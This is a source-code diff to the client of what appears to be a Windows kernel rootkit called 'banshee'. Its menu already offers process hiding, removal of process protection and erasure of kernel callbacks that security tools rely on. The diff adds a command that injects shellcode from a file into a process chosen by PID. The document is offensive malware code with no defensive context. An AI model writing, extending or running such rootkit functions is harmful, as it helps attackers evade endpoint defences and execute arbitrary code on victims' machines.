@@ -47,6 +47,8 @@ main(INT argc, CHAR *argv[])
             printf("    hide      - Hide a process from task manager etc. by PID\n");
             printf("    unprotect - remove protection from process by PID\n");
             printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
+            printf("Injection\n");
+            printf("    shellcode - Inject shellcode into a process by PID.\n");
             printf("Callbacks:\n");
             printf("    callbacks - enumerate kernel callbacks\n");
             printf("    erase_p   - erase process creation kernel callbacks of any driver\n");
@@ -88,6 +90,12 @@ main(INT argc, CHAR *argv[])
         {
             INT targetPid = getIntFromUser("Target pid: ");
             status = banshee.ProtectProcess(targetPid, PS_PROTECTED_SYSTEM);
+        }
+        else if (choice == "shellcode")
+        {
+            INT targetPid = getIntFromUser("Target pid: ");
+            std::wstring filePath = getWStringFromUser(L"Enter file path: ");
+            status = banshee.InjectionShellcode(targetPid, filePath);
         }
         else if (choice == "callbacks")
         {
